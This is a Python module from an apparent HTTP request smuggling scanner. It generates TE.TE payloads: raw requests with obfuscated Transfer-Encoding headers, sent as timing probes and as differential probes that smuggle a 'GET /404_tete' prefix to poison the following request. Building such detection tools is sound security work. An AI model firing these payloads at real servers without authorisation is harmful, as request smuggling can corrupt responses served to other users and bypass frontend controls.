"""TE.TE (Transfer-Encoding obfuscation) payload generator.

In TE.TE smuggling:
- Both frontend and backend support Transfer-Encoding: chunked
- But one server can be tricked into ignoring TE via obfuscation
- This causes one server to use CL fallback while other uses TE

Uses obfuscated Transfer-Encoding headers from obfuscation.py
to find parsing differences between servers.
"""

from typing import List, Tuple
from urllib.parse import urlparse

from http_smuggler.core.models import (
    Endpoint,
    SmugglingVariant,
    DetectionMethod,
)
from http_smuggler.payloads.generator import (
    Payload,
    PayloadGenerator,
    PayloadCategory,
)
from http_smuggler.payloads.obfuscation import (
    TE_OBFUSCATIONS,
    TEObfuscation,
    get_te_mutations_by_category,
    ObfuscationCategory,
)
from http_smuggler.payloads.classic.cl_te import validate_hostname


class TETEPayloadGenerator(PayloadGenerator):
    """Generator for TE.TE smuggling payloads with obfuscation.
    
    This generator creates payloads using all 50+ Transfer-Encoding
    obfuscation variants to find parsing differences.
    """
    
    def __init__(self, max_obfuscations: int = 66):
        """Initialize generator.

        Args:
            max_obfuscations: Maximum number of TE obfuscations to use (default: all 66)
        """
        self.max_obfuscations = max_obfuscations
    
    @property
    def variant(self) -> SmugglingVariant:
        return SmugglingVariant.TE_TE
    
    @property
    def name(self) -> str:
        return "TE.TE Payload Generator"
    
    def _extract_host_path(self, endpoint: Endpoint) -> Tuple[str, str]:
        """Extract and validate host and path from endpoint.

        Validates hostname to prevent CRLF injection and other header attacks.

        Args:
            endpoint: The endpoint to extract host/path from

        Returns:
            Tuple of (validated_host, path)

        Raises:
            ValueError: If hostname contains invalid/dangerous characters
        """
        parsed = urlparse(endpoint.url)
        hostname = parsed.hostname or ""

        # Validate hostname for injection attacks
        hostname = validate_hostname(hostname)

        # Add port if non-standard
        if parsed.port and parsed.port not in (80, 443):
            if not (1 <= parsed.port <= 65535):
                raise ValueError(f"Invalid port number: {parsed.port}")
            host = f"{hostname}:{parsed.port}"
        else:
            host = hostname

        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"

        return host, path
    
    def _get_obfuscations(self) -> List[TEObfuscation]:
        """Get list of TE obfuscations to use."""
        # Prioritize high-risk mutations
        high_risk = get_te_mutations_by_category(risk_level="high")
        medium_risk = get_te_mutations_by_category(risk_level="medium")
        low_risk = get_te_mutations_by_category(risk_level="low")
        
        # Combine with priority
        all_obfuscations = high_risk + medium_risk + low_risk
        return all_obfuscations[:self.max_obfuscations]
    
    def _build_te_header(self, obfuscation: TEObfuscation) -> str:
        """Build the header section with obfuscated TE.
        
        Some obfuscations include multiple headers (duplicates),
        so we need to handle those specially.
        """
        header = obfuscation.header
        
        # Check if this is a duplicate header variant
        if "\r\n" in header and not header.endswith("\r\n"):
            # This contains embedded CRLF (duplicate headers)
            return header
        
        return header
    
    def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate TE.TE timing-based detection payloads.
        
        Creates payloads with obfuscated TE headers that may cause
        parsing differences and timeouts.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        for obfuscation in self._get_obfuscations():
            te_header = self._build_te_header(obfuscation)
            
            # Timing payload: incomplete chunk that causes timeout
            # if one server ignores TE and uses CL
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{te_header}\r\n"
                f"\r\n"
                f"1\r\n"
                f"Z\r\n"
                f"Q"  # Incomplete - causes timeout if TE is processed
            )
            
            payloads.append(Payload(
                name=f"TE.TE-timing-{obfuscation.category.value}",
                variant=self.variant,
                category=PayloadCategory.TIMING,
                raw_request=payload.encode(),
                description=f"TE.TE timing with {obfuscation.description}",
                detection_method=DetectionMethod.TIMING,
                expected_behavior="Server using TE waits for chunk terminator",
                expected_timeout=5.0,
                metadata={
                    "obfuscation": obfuscation.description,
                    "obfuscation_category": obfuscation.category.value,
                    "risk_level": obfuscation.risk_level,
                },
            ))
        
        return payloads
    
    def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate TE.TE differential detection payloads.
        
        Creates payloads with obfuscated TE headers that poison
        the next request if one server ignores the obfuscated TE.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # For differential, we use a smaller set of high-impact obfuscations
        obfuscations = get_te_mutations_by_category(risk_level="high")[:20]
        
        for obfuscation in obfuscations:
            te_header = self._build_te_header(obfuscation)
            
            # Smuggled request that poisons next response
            smuggled = "GET /404_tete HTTP/1.1\r\nX-Ignore: X"
            body = f"0\r\n\r\n{smuggled}"
            content_length = len(body)
            
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {content_length}\r\n"
                f"{te_header}\r\n"
                f"\r\n"
                f"{body}"
            )
            
            payloads.append(Payload(
                name=f"TE.TE-diff-{obfuscation.category.value}",
                variant=self.variant,
                category=PayloadCategory.DIFFERENTIAL,
                raw_request=payload.encode(),
                description=f"TE.TE differential with {obfuscation.description}",
                detection_method=DetectionMethod.DIFFERENTIAL,
                expected_behavior="Next request receives 404 if TE was ignored",
                poison_prefix="GET /404_tete",
                metadata={
                    "obfuscation": obfuscation.description,
                    "obfuscation_category": obfuscation.category.value,
                    "risk_level": obfuscation.risk_level,
                },
            ))
        
        return payloads
    
    def generate_category_payloads(
        self,
        endpoint: Endpoint,
        category: ObfuscationCategory,
    ) -> List[Payload]:
        """Generate payloads for a specific obfuscation category.
        
        Args:
            endpoint: Target endpoint
            category: Obfuscation category to use
        
        Returns:
            List of payloads using only that category
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        obfuscations = get_te_mutations_by_category(category=category)
        
        for obfuscation in obfuscations:
            te_header = self._build_te_header(obfuscation)
            
            # Timing payload
            timing_payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{te_header}\r\n"
                f"\r\n"
                f"1\r\n"
                f"Z\r\n"
                f"Q"
            )
            
            payloads.append(Payload(
                name=f"TE.TE-{category.value}-timing",
                variant=self.variant,
                category=PayloadCategory.TIMING,
                raw_request=timing_payload.encode(),
                description=f"TE.TE {category.value}: {obfuscation.description}",
                detection_method=DetectionMethod.TIMING,
                expected_behavior="Timeout if server ignores obfuscated TE",
                expected_timeout=5.0,
                metadata={
                    "obfuscation": obfuscation.description,
                    "obfuscation_category": category.value,
                },
            ))
        
        return payloads


class TETECategoryGenerator:
    """Helper to generate TE.TE payloads by specific categories."""
    
    @staticmethod
    def whitespace_payloads(endpoint: Endpoint) -> List[Payload]:
        """Generate payloads using whitespace obfuscations."""
        gen = TETEPayloadGenerator()
        return gen.generate_category_payloads(
            endpoint, 
            ObfuscationCategory.WHITESPACE
        )
    
    @staticmethod
    def capitalization_payloads(endpoint: Endpoint) -> List[Payload]:
        """Generate payloads using capitalization obfuscations."""
        gen = TETEPayloadGenerator()
        return gen.generate_category_payloads(
            endpoint,
            ObfuscationCategory.CAPITALIZATION
        )
    
    @staticmethod
    def special_char_payloads(endpoint: Endpoint) -> List[Payload]:
        """Generate payloads using special character obfuscations."""
        gen = TETEPayloadGenerator()
        return gen.generate_category_payloads(
            endpoint,
            ObfuscationCategory.SPECIAL_CHARS
        )
    
    @staticmethod
    def duplicate_payloads(endpoint: Endpoint) -> List[Payload]:
        """Generate payloads using duplicate header obfuscations."""
        gen = TETEPayloadGenerator()
        return gen.generate_category_payloads(
            endpoint,
            ObfuscationCategory.DUPLICATE
        )

